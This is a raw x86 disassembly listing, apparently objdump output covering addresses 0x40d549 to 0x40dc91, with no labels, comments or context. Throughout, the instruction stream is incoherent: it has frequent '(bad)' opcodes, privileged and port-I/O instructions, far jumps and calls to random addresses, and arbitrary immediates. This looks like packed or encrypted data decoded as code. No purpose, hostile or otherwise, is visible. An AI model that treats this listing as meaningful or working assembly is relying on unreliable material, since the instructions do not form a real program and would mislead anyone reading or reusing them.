  40d549:	sub    esp,DWORD PTR [esi-0x6b7ea7b7]
  40d54f:	xor    esi,DWORD PTR [ecx]
  40d551:	in     al,0x3b
  40d553:	ror    DWORD PTR [esi-0x38],0x62
  40d557:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d558:	nop
  40d559:	test   DWORD PTR ds:0xb4486624,ecx
  40d55f:	pop    ecx
  40d560:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d561:	je     0x40d585
  40d563:	(bad)  
  40d564:	jmp    0x563b:0xe44cda9b
  40d56b:	xor    bl,BYTE PTR [ebp+0x2db50d24]
  40d571:	add    eax,0x92f0bf59
  40d576:	dec    ebx
  40d577:	and    eax,0xafa56e90
  40d57c:	mov    ebp,0xf31be917
  40d581:	mov    al,0xef
  40d583:	xchg   ecx,eax
  40d584:	push   0xffffffc8
  40d586:	ins    BYTE PTR es:[edi],dx
  40d587:	or     edx,ebp
  40d589:	xchg   ebp,eax
  40d58a:	cmp    BYTE PTR [ebx-0x19],ah
  40d58d:	mov    ch,0x35
  40d58f:	in     eax,0xb2
  40d591:	cmp    eax,0x837e5ca
  40d596:	inc    esi
  40d597:	xchg   ecx,eax
  40d598:	mov    ds:0x4262c57a,al
  40d59d:	dec    BYTE PTR [esi]
  40d59f:	add    al,0xf
  40d5a1:	push   edi
  40d5a2:	mov    ch,0xe0
  40d5a4:	or     eax,ebp
  40d5a6:	push   0xffffffbc
  40d5a8:	pop    ss
  40d5a9:	int3   
  40d5aa:	int3   
  40d5ab:	cmp    BYTE PTR [edx-0x9],ch
  40d5ae:	push   ss
  40d5af:	adc    bl,BYTE PTR [eax+esi*8-0xd]
  40d5b3:	cmp    ebp,ecx
  40d5b5:	fwait
  40d5b6:	xchg   edi,eax
  40d5b7:	loope  0x40d56e
  40d5b9:	fmul   QWORD PTR [ebx]
  40d5bb:	mov    eax,ds:0x84e9f8eb
  40d5c0:	jle    0x40d62b
  40d5c2:	mov    al,0x7c
  40d5c4:	ds hlt 
  40d5c6:	pop    ecx
  40d5c7:	nop
  40d5c8:	leave  
  40d5c9:	jae    0x40d5ee
  40d5cb:	cmp    DWORD PTR [ebp+0x42467443],esp
  40d5d1:	sbb    eax,0xb5ddaab7
  40d5d6:	out    0xa4,al
  40d5d8:	sub    ebp,DWORD PTR [edi+0x21e48c4d]
  40d5de:	sub    DWORD PTR [ebx],0xffffffbe
  40d5e1:	das    
  40d5e2:	xchg   edi,eax
  40d5e3:	cmp    esi,DWORD PTR [eax+0x14]
  40d5e6:	iret   
  40d5e7:	cs (bad) 
  40d5e9:	jg     0x40d5ac
  40d5eb:	rol    BYTE PTR [edi+eiz*8],0x23
  40d5ef:	push   0x36
  40d5f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d5f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d5f3:	inc    ecx
  40d5f4:	jno    0x40d5bd
  40d5f6:	sub    edx,edi
  40d5f8:	jo     0x40d588
  40d5fa:	(bad)  
  40d5fb:	iret   
  40d5fc:	pop    cx
  40d5fe:	jns    0x40d632
  40d600:	mov    ds:0xb206f341,al
  40d605:	push   ss
  40d606:	jo     0x40d61d
  40d608:	daa    
  40d609:	mov    esi,0x6e55f8d8
  40d60e:	in     al,dx
  40d60f:	pop    edi
  40d610:	fld    TBYTE PTR [edx+0x61bd24a4]
  40d616:	shr    BYTE PTR [ebx+0x20],1
  40d619:	push   esi
  40d61a:	dec    ebp
  40d61b:	or     edx,esp
  40d61d:	out    0x1b,al
  40d61f:	out    0xd5,al
  40d621:	xchg   esp,eax
  40d622:	test   DWORD PTR [ecx],ebx
  40d624:	sub    eax,ecx
  40d626:	push   eax
  40d627:	call   FWORD PTR [ecx+0x406916a9]
  40d62d:	loop   0x40d5f3
  40d62f:	mov    esi,0xb7f1c78
  40d634:	lahf   
  40d635:	div    BYTE PTR [ebp-0x7c]
  40d638:	add    BYTE PTR [esi+0x17],ch
  40d63b:	outs   dx,BYTE PTR ds:[esi]
  40d63c:	addr16 aaa 
  40d63e:	sub    ebx,edi
  40d640:	push   ebx
  40d641:	push   ecx
  40d642:	sub    ah,BYTE PTR [ebp-0x4d949e1d]
  40d648:	pop    es
  40d649:	and    BYTE PTR ds:0xed07738d,ah
  40d64f:	mov    esp,0x7d006216
  40d654:	fwait
  40d655:	out    dx,al
  40d656:	cmp    dh,dh
  40d658:	mov    bh,0xb8
  40d65a:	push   esp
  40d65b:	xchg   DWORD PTR [ebx+edx*2+0x20],esi
  40d65f:	mov    ebx,0x68d5cfb3
  40d664:	rcr    BYTE PTR [ecx],1
  40d666:	mov    ch,0x4b
  40d668:	sahf   
  40d669:	and    DWORD PTR [eax],0xc5a1f907
  40d66f:	add    DWORD PTR [edx+0x22d90035],edi
  40d675:	aaa    
  40d676:	adc    ah,BYTE PTR [ecx-0x3fae65e1]
  40d67c:	mov    esi,0x8c6c1829
  40d681:	call   0x8ad84292
  40d686:	stos   BYTE PTR es:[edi],al
  40d687:	pop    ds
  40d688:	sbb    DWORD PTR [edx+0x60],ecx
  40d68b:	xlat   BYTE PTR ds:[ebx]
  40d68c:	outs   dx,DWORD PTR ds:[esi]
  40d68d:	push   0x6df47dcf
  40d692:	pop    esp
  40d693:	scas   eax,DWORD PTR es:[edi]
  40d694:	(bad)
  40d697:	cmp    ah,BYTE PTR [esi]
  40d699:	dec    ebx
  40d69a:	(bad)  
  40d69b:	ins    DWORD PTR es:[edi],dx
  40d69c:	fisttp DWORD PTR [ecx-0x4]
  40d69f:	mov    edx,0x396b5d55
  40d6a4:	mov    ebp,0xb32823c
  40d6a9:	pop    esi
  40d6aa:	test   eax,0xa47ef6b1
  40d6af:	test   BYTE PTR [ecx-0x35],cl
  40d6b2:	push   edi
  40d6b3:	pop    ss
  40d6b4:	iret   
  40d6b5:	into   
  40d6b6:	loopne 0x40d6d8
  40d6b8:	imul   ebx,DWORD PTR [eax],0x5cbfadd9
  40d6be:	ss icebp 
  40d6c0:	ss push 0x94ef6712
  40d6c6:	sahf   
  40d6c7:	adc    esi,DWORD PTR [esi]
  40d6c9:	mov    al,0xc4
  40d6cb:	inc    edx
  40d6cc:	loopne 0x40d689
  40d6ce:	dec    ebp
  40d6cf:	adc    edi,DWORD PTR [edi+0x71fc3d8a]
  40d6d5:	mov    bl,0x81
  40d6d7:	pop    edx
  40d6d8:	pushf  
  40d6d9:	mov    eax,ds:0x53a28d3e
  40d6de:	int    0x60
  40d6e0:	mov    DWORD PTR [ebx-0x4f],ebp
  40d6e3:	xor    al,0xd9
  40d6e5:	cs mov ebx,0xbba5f40e
  40d6eb:	test   al,0x4b
  40d6ed:	mov    al,ds:0xde95943e
  40d6f2:	sahf   
  40d6f3:	repz ja 0x40d704
  40d6f6:	sahf   
  40d6f7:	cwde   
  40d6f8:	ja     0x40d6ec
  40d6fa:	xchg   edi,eax
  40d6fb:	jno    0x40d6da
  40d6fd:	sbb    DWORD PTR [ebp-0x537aa212],ecx
  40d703:	jl     0x40d6f2
  40d705:	add    DWORD PTR [eax],eax
  40d707:	inc    edi
  40d708:	loope  0x40d733
  40d70a:	fs ins BYTE PTR es:[edi],dx
  40d70c:	xor    dh,BYTE PTR [edx-0x5a80fc26]
  40d712:	rol    ch,1
  40d714:	push   ebx
  40d715:	out    dx,al
  40d716:	push   edi
  40d717:	sub    cl,0x26
  40d71a:	shl    DWORD PTR [eax-0x1cfe5a06],cl
  40d720:	int    0xc7
  40d722:	scas   eax,DWORD PTR es:[edi]
  40d723:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d724:	jno    0x40d70b
  40d726:	cmp    DWORD PTR [edi+0xa1f1089],edx
  40d72c:	jmp    0xc345af1e
  40d731:	jge    0x40d6e8
  40d733:	xor    BYTE PTR [ecx+0xd],al
  40d736:	outs   dx,DWORD PTR ds:[esi]
  40d737:	and    DWORD PTR [edx+0x79d8abb3],eax
  40d73d:	jae    0x40d6d6
  40d73f:	lahf   
  40d740:	push   ebp
  40d741:	sti    
  40d742:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d743:	mov    gs,WORD PTR [eax+esi*4+0x70a95a64]
  40d74a:	adc    al,0xdb
  40d74c:	mov    dh,0x29
  40d74e:	jge    0x40d701
  40d750:	jns    0x40d730
  40d752:	xor    ah,BYTE PTR [ebp+0x7cd1572]
  40d758:	(bad)  
  40d759:	aas    
  40d75a:	push   cs
  40d75b:	push   eax
  40d75c:	iret   
  40d75d:	fsubr  QWORD PTR [ebx+ebp*4]
  40d760:	xchg   ecx,eax
  40d761:	push   esi
  40d762:	push   0xdc3aa795
  40d767:	fwait
  40d768:	mov    ebp,0xff59a84a
  40d76d:	and    bh,BYTE PTR [edi-0x63]
  40d770:	lahf   
  40d771:	or     DWORD PTR [esi+0x79779f80],edx
  40d777:	xlat   BYTE PTR ds:[ebx]
  40d778:	cmp    DWORD PTR [edx-0x56],ebx
  40d77b:	jmp    0xc80b:0x5313d93a
  40d782:	pusha  
  40d783:	inc    edx
  40d784:	std    
  40d785:	and    edi,DWORD PTR [ebx]
  40d787:	jb     0x40d7b1
  40d789:	sti    
  40d78a:	adc    eax,0x8308cc86
  40d78f:	cmp    BYTE PTR [ebx+0x461bc304],dl
  40d795:	xchg   ecx,eax
  40d796:	mov    WORD PTR [ecx+0x7c],es
  40d799:	test   al,0xc3
  40d79b:	pop    ebx
  40d79c:	lahf   
  40d79d:	rol    DWORD PTR [eax],0xb3
  40d7a0:	jmp    0x40d779
  40d7a2:	jmp    0xbf46a54
  40d7a7:	inc    BYTE PTR [edi+0x6b]
  40d7aa:	lods   eax,DWORD PTR ds:[esi]
  40d7ab:	aas    
  40d7ac:	jle    0x40d7b7
  40d7ae:	cmp    ah,BYTE PTR [ebx-0x6d]
  40d7b1:	xchg   DWORD PTR [edi+0x13],ecx
  40d7b4:	jge    0x40d7ad
  40d7b6:	mov    WORD PTR [esp+edx*1],gs
  40d7b9:	jecxz  0x40d789
  40d7bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d7bc:	dec    ebp
  40d7bd:	jno    0x40d7fb
  40d7bf:	xlat   BYTE PTR ds:[ebx]
  40d7c0:	add    bl,ah
  40d7c2:	(bad)  
  40d7c3:	cmp    DWORD PTR [esi],edx
  40d7c5:	xlat   BYTE PTR ds:[ebx]
  40d7c6:	stos   DWORD PTR es:[edi],eax
  40d7c7:	push   0x43
  40d7c9:	es pop esp
  40d7cb:	ret    0x3fcb
  40d7ce:	outs   dx,DWORD PTR ds:[esi]
  40d7cf:	pop    ecx
  40d7d0:	mov    cl,0x73
  40d7d2:	inc    ecx
  40d7d3:	push   ebp
  40d7d4:	cld    
  40d7d5:	shl    BYTE PTR [esi],0x14
  40d7d8:	jnp    0x40d7aa
  40d7da:	retf   0xd0fd
  40d7dd:	pop    edx
  40d7de:	pop    ecx
  40d7df:	lea    edx,[eax-0x73]
  40d7e2:	(bad)  
  40d7e3:	sub    BYTE PTR [edi-0x5a],ah
  40d7e6:	pop    ebp
  40d7e7:	mov    ecx,0x2faff639
  40d7ec:	push   esp
  40d7ed:	mov    ch,0x5b
  40d7ef:	sti    
  40d7f0:	pop    esi
  40d7f1:	push   es
  40d7f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d7f3:	mov    al,ds:0xe143d40c
  40d7f8:	cs cmp al,0xaf
  40d7fb:	lahf   
  40d7fc:	(bad)  
  40d7fd:	fsub   QWORD PTR cs:[ebp-0x251486b2]
  40d804:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d805:	xlat   BYTE PTR ds:[ebx]
  40d806:	jp     0x40d793
  40d808:	inc    edi
  40d809:	outs   dx,BYTE PTR ds:[esi]
  40d80a:	jg     0x40d843
  40d80c:	sub    ebp,DWORD PTR ds:0xf591d7d4
  40d812:	clc    
  40d813:	sbb    edi,DWORD PTR [ebx]
  40d815:	jb     0x40d7ba
  40d817:	test   eax,0xace07860
  40d81c:	or     BYTE PTR [edx],al
  40d81e:	(bad)  
  40d81f:	jmp    0x6651b712
  40d824:	pop    esi
  40d825:	std    
  40d826:	mov    al,ds:0x147a846b
  40d82b:	cmp    eax,0x84c1c265
  40d830:	cdq    
  40d831:	sar    DWORD PTR [ebx-0x13],0xb1
  40d835:	sub    ecx,DWORD PTR [edi-0x71b0701d]
  40d83b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d83c:	add    esp,eax
  40d83e:	pop    ecx
  40d83f:	xor    sp,WORD PTR [ebp+0x35041e27]
  40d846:	jno    0x40d8c5
  40d848:	enter  0xede0,0xc9
  40d84c:	popa   
  40d84d:	(bad)  
  40d84e:	les    ebx,FWORD PTR [ecx-0x40]
  40d851:	arpl   WORD PTR [ebp+edx*1-0x7f],si
  40d855:	fcmovnbe st,st(5)
  40d857:	shl    DWORD PTR [edx],cl
  40d859:	in     al,0x9f
  40d85b:	pop    ebp
  40d85c:	loope  0x40d80a
  40d85e:	fidivr DWORD PTR [edx-0x355bb5f5]
  40d864:	fwait
  40d865:	in     al,0xb
  40d867:	inc    edx
  40d868:	out    0x12,eax
  40d86a:	leave  
  40d86b:	lock add ecx,ebx
  40d86e:	cmp    DWORD PTR [esi+0x23cc4fe1],edx
  40d874:	ins    BYTE PTR es:[edi],dx
  40d875:	jecxz  0x40d898
  40d877:	and    al,0x39
  40d879:	and    al,0x59
  40d87b:	or     bh,ch
  40d87d:	fwait
  40d87e:	hlt    
  40d87f:	jecxz  0x40d829
  40d881:	ja     0x40d872
  40d883:	aam    0xc3
  40d885:	adc    eax,0x641ba4a0
  40d88a:	cmp    BYTE PTR [eax+0x3a510694],0xc1
  40d891:	clc    
  40d892:	or     DWORD PTR [edx-0x26],0x2fdd282d
  40d899:	mov    WORD PTR [edx+0x1dc02fdc],ss
  40d89f:	xor    DWORD PTR ds:[ecx-0x56],0xd6e0fe2c
  40d8a7:	cmp    BYTE PTR ss:[edi],0x71
  40d8ab:	or     al,0x23
  40d8ad:	outs   dx,DWORD PTR ds:[esi]
  40d8ae:	lahf   
  40d8af:	mov    ah,0xb7
  40d8b1:	mov    dl,BYTE PTR [edi-0x2a]
  40d8b4:	xor    DWORD PTR [ecx-0x3920df07],ebp
  40d8ba:	push   cs
  40d8bb:	lods   al,BYTE PTR ds:[esi]
  40d8bc:	and    DWORD PTR [ebx-0xc],0xd2a8bb0e
  40d8c3:	popf   
  40d8c4:	fsub   QWORD PTR [esi-0x57]
  40d8c7:	xor    DWORD PTR [ebp+0x1135b2],0x882cabda
  40d8d1:	mov    cl,0xfb
  40d8d3:	jbe    0x40d8e5
  40d8d5:	nop
  40d8d6:	rcl    ah,cl
  40d8d8:	loop   0x40d957
  40d8da:	cmp    dh,BYTE PTR [ebx-0x2c7e66b6]
  40d8e0:	not    BYTE PTR [ecx-0x54f6e56a]
  40d8e6:	shr    BYTE PTR [edi+0x3e7dd48],cl
  40d8ec:	push   0x90ba621d
  40d8f1:	repnz xlat BYTE PTR ds:[ebx]
  40d8f3:	jecxz  0x40d963
  40d8f5:	sub    eax,DWORD PTR [esi]
  40d8f7:	dec    edi
  40d8f8:	inc    eax
  40d8f9:	pop    eax
  40d8fa:	je     0x40d96c
  40d8fc:	dec    ecx
  40d8fd:	xor    DWORD PTR [eax+0x2e],eax
  40d900:	jge    0x40d8cb
  40d902:	push   cs
  40d903:	loopne 0x40d959
  40d905:	push   cs
  40d906:	jo     0x40d8d7
  40d908:	lahf   
  40d909:	xchg   ecx,eax
  40d90a:	gs mov cl,0x2a
  40d90d:	scas   al,BYTE PTR es:[edi]
  40d90e:	dec    edi
  40d90f:	cmp    BYTE PTR [edx-0x5599e993],bl
  40d915:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d916:	mov    ds:0xde610da3,al
  40d91b:	fsub   QWORD PTR [esi]
  40d91d:	xor    BYTE PTR [ecx+ebx*1],ah
  40d920:	mov    esp,eax
  40d922:	arpl   WORD PTR [esi-0x86bdd76],si
  40d928:	inc    edi
  40d929:	dec    ecx
  40d92a:	jae    0x40d964
  40d92c:	pop    ecx
  40d92d:	jle    0x40d987
  40d92f:	sbb    esi,DWORD PTR [ebp+ecx*8-0x40f9d5a6]
  40d936:	icebp  
  40d937:	xchg   ebx,esp
  40d939:	and    BYTE PTR [esi+0x6facec1c],bh
  40d93f:	jl     0x40d99d
  40d941:	ficomp DWORD PTR [eax+0x110076cd]
  40d947:	inc    esp
  40d948:	clc    
  40d949:	xor    al,BYTE PTR [ecx+esi*1]
  40d94c:	xchg   edx,eax
  40d94d:	jno    0x40d963
  40d94f:	mov    edi,0xa40afeb
  40d954:	add    cl,al
  40d956:	into   
  40d957:	and    al,0x7d
  40d959:	outs   dx,DWORD PTR ds:[esi]
  40d95a:	push   ebx
  40d95b:	push   0x70ce2b04
  40d960:	mov    WORD PTR cs:[ebx+0x20],?
  40d964:	addr16 dec ebx
  40d966:	fwait
  40d967:	xchg   ecx,eax
  40d968:	scas   eax,DWORD PTR es:[edi]
  40d969:	jb     0x40d9d2
  40d96b:	jno    0x40d967
  40d96d:	sahf   
  40d96e:	je     0x40d909
  40d970:	inc    ebx
  40d971:	adc    dl,BYTE PTR [ebp-0x1392aea5]
  40d977:	xchg   esi,eax
  40d978:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d979:	retf   0xd805
  40d97c:	test   DWORD PTR [ebx-0x51b79a71],edx
  40d982:	jmp    0x11f0a32c
  40d987:	or     BYTE PTR [ebp-0x83b2157],dl
  40d98d:	adc    ebx,DWORD PTR [edx]
  40d98f:	jg     0x40d9d1
  40d991:	cmp    ebx,ecx
  40d993:	aam    0x77
  40d995:	mov    bl,0x3d
  40d997:	xchg   ecx,eax
  40d998:	loop   0x40d9f5
  40d99a:	cmc    
  40d99b:	outs   dx,DWORD PTR ds:[esi]
  40d99c:	fcom   DWORD PTR [edx-0x71130d80]
  40d9a2:	mov    ebp,0x798f50c
  40d9a7:	dec    edi
  40d9a8:	les    ebx,FWORD PTR [edx]
  40d9aa:	add    al,BYTE PTR [edx+0xa]
  40d9ad:	out    0x1e,eax
  40d9af:	pushf  
  40d9b0:	loope  0x40d9a4
  40d9b2:	fld    TBYTE PTR [eax-0x676e99dd]
  40d9b8:	fldenv [eax]
  40d9ba:	mov    eax,0x32765389
  40d9bf:	cld    
  40d9c0:	dec    edx
  40d9c1:	dec    edi
  40d9c2:	pop    ss
  40d9c3:	and    al,0xed
  40d9c5:	sti    
  40d9c6:	sub    eax,0x3f6f3fd6
  40d9cb:	jbe    0x40d9a9
  40d9cd:	fmul   st(2),st
  40d9cf:	outs   dx,BYTE PTR ds:[esi]
  40d9d0:	ins    BYTE PTR es:[edi],dx
  40d9d1:	shr    BYTE PTR [ebp-0x3b],0x6
  40d9d5:	mov    dl,0xab
  40d9d7:	sbb    ebx,ebp
  40d9d9:	sti    
  40d9da:	stos   BYTE PTR es:[edi],al
  40d9db:	sbb    bh,BYTE PTR [esi]
  40d9dd:	mov    al,ds:0xcc1c90a3
  40d9e2:	call   0xdfb0c800
  40d9e7:	mov    al,0xa
  40d9e9:	jae    0x40d980
  40d9eb:	sub    eax,0xb49fead8
  40d9f0:	pop    edx
  40d9f1:	inc    edx
  40d9f2:	test   DWORD PTR [ebx+0x4b],esi
  40d9f5:	out    dx,eax
  40d9f6:	hlt    
  40d9f7:	sbb    al,0x59
  40d9f9:	mov    dh,BYTE PTR [ebx]
  40d9fb:	jnp    0x40d9f5
  40d9fd:	xchg   edx,eax
  40d9fe:	push   0x6476b98a
  40da03:	xchg   ebp,eax
  40da04:	fild   DWORD PTR [ebp-0x20]
  40da07:	por    mm3,QWORD PTR [edi+0x33]
  40da0b:	add    cl,ch
  40da0d:	sbb    al,BYTE PTR [ecx-0x7953dbe0]
  40da13:	jmp    0x40d9db
  40da15:	cdq    
  40da16:	inc    esi
  40da17:	stc    
  40da18:	push   0xeb236478
  40da1d:	add    DWORD PTR [esi-0x27],edi
  40da20:	mov    BYTE PTR [eax+0x520466b2],dl
  40da26:	rol    BYTE PTR [ecx+0x35a888c7],0xc1
  40da2d:	aaa    
  40da2e:	lahf   
  40da2f:	adc    DWORD PTR [ebp+ecx*4-0x52f26cf7],0xf677c128
  40da3a:	fild   DWORD PTR [ecx+0x2cbeb522]
  40da40:	inc    edi
  40da41:	inc    eax
  40da42:	adc    al,0x9c
  40da44:	mov    dh,0xb9
  40da46:	xchg   edx,eax
  40da47:	scas   al,BYTE PTR es:[edi]
  40da48:	xor    BYTE PTR [eax],ah
  40da4a:	dec    ebx
  40da4b:	pop    edx
  40da4c:	std    
  40da4d:	and    BYTE PTR [ebp-0x53],ah
  40da50:	dec    edi
  40da51:	test   DWORD PTR [eax+ebp*4+0x45],ecx
  40da55:	lods   eax,DWORD PTR ds:[esi]
  40da56:	cmp    dh,BYTE PTR [eax]
  40da58:	dec    ecx
  40da59:	jne    0x40d9df
  40da5b:	cmc    
  40da5c:	pop    ss
  40da5d:	out    0xcb,eax
  40da5f:	sahf   
  40da60:	rcl    BYTE PTR [ecx+0x14],0xa
  40da64:	les    ebx,FWORD PTR [ecx]
  40da66:	iret   
  40da67:	ins    BYTE PTR es:[edi],dx
  40da68:	daa    
  40da69:	mov    eax,ds:0x782378d2
  40da6e:	pop    DWORD PTR [edi]
  40da70:	sti    
  40da71:	pusha  
  40da72:	jge    0x40da84
  40da74:	aad    0x80
  40da76:	xchg   edx,eax
  40da77:	adc    BYTE PTR [ebx+0x68],dh
  40da7a:	push   ecx
  40da7b:	mov    bh,0xea
  40da7d:	aam    0xb0
  40da7f:	stc    
  40da80:	dec    esp
  40da81:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40da82:	sbb    DWORD PTR [ecx-0x628c643b],0xffffff9c
  40da89:	adc    esi,eax
  40da8b:	xor    eax,0x5ecbf90d
  40da90:	mov    al,0x5e
  40da92:	lods   eax,DWORD PTR ds:[esi]
  40da93:	sahf   
  40da94:	neg    DWORD PTR [eax-0x16]
  40da97:	mov    ah,0xe3
  40da99:	adc    ebp,ebx
  40da9b:	jnp    0x40da8b
  40da9d:	and    DWORD PTR [ecx+0x14],esi
  40daa0:	mov    bl,0x31
  40daa2:	push   cs
  40daa3:	(bad)  
  40daa4:	sbb    BYTE PTR [ebp+0x743fff20],bl
  40daaa:	das    
  40daab:	and    edx,edi
  40daad:	push   eax
  40daae:	mov    ebp,0x4703c053
  40dab3:	imul   esi,DWORD PTR [edi-0x59],0xffffffe9
  40dab7:	into   
  40dab8:	int3   
  40dab9:	mov    al,0x4
  40dabb:	xor    esi,ebx
  40dabd:	xchg   edx,eax
  40dabe:	jae    0x40daa4
  40dac0:	pop    ebp
  40dac1:	test   al,0x68
  40dac3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dac4:	sbb    DWORD PTR [ecx+0x1c],esi
  40dac7:	stc    
  40dac8:	push   es
  40dac9:	mov    esi,gs
  40dacb:	push   0x496394d5
  40dad0:	mov    eax,0x3328dfe4
  40dad5:	cmp    dh,dl
  40dad7:	popa   
  40dad8:	sti    
  40dad9:	(bad)  
  40dada:	cmp    esi,DWORD PTR [edi+0x4d]
  40dadd:	and    ch,BYTE PTR [ebp+0x5fe527ac]
  40dae3:	dec    edi
  40dae4:	cmp    BYTE PTR [edi+ebx*1+0x3f0babe0],0x4
  40daec:	jo     0x40dabc
  40daee:	pop    edx
  40daef:	out    dx,eax
  40daf0:	sti    
  40daf1:	lock fistp WORD PTR [ebp-0x2688ec66]
  40daf8:	das    
  40daf9:	push   0xc71de60d
  40dafe:	lods   al,BYTE PTR ds:[esi]
  40daff:	jp     0x40db08
  40db01:	and    eax,0x45c432c9
  40db06:	mov    WORD PTR [edi],ds
  40db08:	test   BYTE PTR [ebx],0xd2
  40db0b:	jg     0x40db8a
  40db0d:	jnp    0x40db7c
  40db0f:	sub    edx,DWORD PTR [esi+ebx*8+0x1a1838ae]
  40db16:	push   ecx
  40db17:	retf   
  40db18:	or     eax,0xfc6f1c50
  40db1d:	out    dx,eax
  40db1e:	fistp  DWORD PTR [esi-0x4a]
  40db21:	or     eax,esi
  40db23:	xchg   BYTE PTR [esi+eiz*2],dl
  40db26:	pushf  
  40db27:	dec    ebp
  40db28:	ss in  al,0xc5
  40db2b:	add    ah,bl
  40db2d:	cmp    al,0x1f
  40db2f:	enter  0x27f6,0xcb
  40db33:	or     al,0xd
  40db35:	iret   
  40db36:	mov    ebp,0x3f106204
  40db3b:	sub    DWORD PTR [ecx-0x6d0beed2],esp
  40db41:	mov    al,ds:0x339fcfc8
  40db46:	(bad)  
  40db47:	jmp    0x24bc6eec
  40db4c:	in     eax,0xb2
  40db4e:	adc    dh,al
  40db50:	das    
  40db51:	push   edx
  40db52:	iret   
  40db53:	xchg   ecx,eax
  40db54:	mov    bl,0x38
  40db56:	cmc    
  40db57:	mov    eax,ds:0xfb8eb6
  40db5c:	adc    esp,ecx
  40db5e:	add    ah,dl
  40db60:	shl    DWORD PTR [esi-0x2637ca60],1
  40db66:	and    eax,0xfdfa98ac
  40db6b:	gs std 
  40db6d:	or     edx,eax
  40db6f:	ret    
  40db70:	dec    edi
  40db71:	repz adc al,0x11
  40db74:	mov    dh,0x78
  40db76:	mov    ds:0xfffa9a2c,al
  40db7b:	mov    eax,ds:0x42561bab
  40db80:	jl     0x40dba7
  40db82:	scas   al,BYTE PTR es:[edi]
  40db83:	xor    ah,BYTE PTR [ecx+0x30]
  40db86:	(bad)  
  40db87:	pop    ebp
  40db88:	xor    eax,0x7c6253b3
  40db8d:	pop    esp
  40db8e:	mov    al,BYTE PTR [eax-0xa739d62]
  40db94:	in     eax,dx
  40db95:	add    al,0xd7
  40db97:	adc    BYTE PTR [esp+edi*4],ah
  40db9a:	sub    edi,DWORD PTR fs:[edi]
  40db9d:	mov    al,0x81
  40db9f:	xchg   ebp,eax
  40dba0:	popf   
  40dba1:	or     dl,bl
  40dba3:	pop    ecx
  40dba4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dba5:	(bad)  
  40dba6:	clc    
  40dba7:	icebp  
  40dba8:	xlat   BYTE PTR ds:[ebx]
  40dba9:	and    eax,0xb919cba6
  40dbae:	cld    
  40dbaf:	jnp    0x40db43
  40dbb1:	pop    ebp
  40dbb2:	mov    ds:0xd9c71c56,al
  40dbb7:	mov    ds:0xb731fda8,al
  40dbbc:	mov    eax,ds:0x1c3aa62d
  40dbc1:	or     bl,BYTE PTR [eax-0x574e5d72]
  40dbc7:	mov    edx,0x91d78c59
  40dbcc:	sbb    BYTE PTR [ebx+0x74],ch
  40dbcf:	fnstsw WORD PTR [eax-0x23]
  40dbd2:	mov    eax,0x7c671e8b
  40dbd7:	xchg   ecx,eax
  40dbd8:	in     eax,0xd3
  40dbda:	je     0x40dbf0
  40dbdc:	test   eax,0x59de3c0f
  40dbe1:	jmp    0x969:0xf6811fb4
  40dbe8:	or     DWORD PTR [ebx-0x68],ebp
  40dbeb:	ret    0x59cf
  40dbee:	ror    BYTE PTR [esp+eiz*8-0x109373d7],1
  40dbf5:	out    0xd7,eax
  40dbf7:	fimul  DWORD PTR [eax+0x6c]
  40dbfa:	outs   dx,DWORD PTR ds:[esi]
  40dbfb:	pop    edx
  40dbfc:	fwait
  40dbfd:	leave  
  40dbfe:	mov    bl,0x6
  40dc00:	dec    ebx
  40dc01:	popf   
  40dc02:	sub    BYTE PTR [edx+0x79],ah
  40dc05:	mov    ds:0x4b4cd32f,al
  40dc0a:	cmp    al,0x71
  40dc0c:	sti    
  40dc0d:	call   0x85a6:0x85909337
  40dc14:	int    0xfc
  40dc16:	cmp    BYTE PTR [eax-0x56945d91],bh
  40dc1c:	retf   
  40dc1d:	cli    
  40dc1e:	jbe    0x40dba9
  40dc20:	cmp    DWORD PTR [edx+0x9f1d43f],0x7e19c34f
  40dc2a:	lahf   
  40dc2b:	popf   
  40dc2c:	lods   al,BYTE PTR ds:[esi]
  40dc2d:	fldenv [esi]
  40dc2f:	shr    DWORD PTR [edi-0x2f],cl
  40dc32:	dec    edi
  40dc33:	add    eax,0xd5d196ab
  40dc38:	pop    ebx
  40dc39:	adc    BYTE PTR [ebp-0x1070aa81],bl
  40dc3f:	test   DWORD PTR [edi+edx*1+0x44],ebp
  40dc43:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dc44:	sbb    BYTE PTR [esi+0x9],bh
  40dc47:	out    dx,eax
  40dc48:	or     DWORD PTR [ecx+0x30],eax
  40dc4b:	xchg   esp,eax
  40dc4c:	adc    BYTE PTR [edi-0x69],0x75
  40dc50:	fdivr  st(7),st
  40dc52:	mov    eax,ds:0xfe2a1399
  40dc57:	call   0xf5ceb98d
  40dc5c:	out    0x44,eax
  40dc5e:	and    al,0x2d
  40dc60:	and    bh,bh
  40dc62:	xor    esi,DWORD PTR [ebp+0x76]
  40dc65:	push   ss
  40dc66:	out    dx,eax
  40dc67:	sbb    bl,0xeb
  40dc6a:	cmp    eax,0xc79ba9d0
  40dc6f:	mov    ecx,0x21022e2c
  40dc74:	inc    ebx
  40dc75:	out    0xc0,al
  40dc77:	shl    BYTE PTR [ecx-0x2f],0xd2
  40dc7b:	mov    ebp,0xfb69a842
  40dc80:	imul   DWORD PTR [esi+0x32]
  40dc83:	pop    esi
  40dc84:	scas   al,BYTE PTR es:[edi]
  40dc85:	repnz dec esp
  40dc87:	push   ss
  40dc88:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dc89:	lods   eax,DWORD PTR ds:[esi]
  40dc8a:	mov    ds,WORD PTR [ebx-0x750a028c]
  40dc90:	in     al,dx
  40dc91:	sahf   
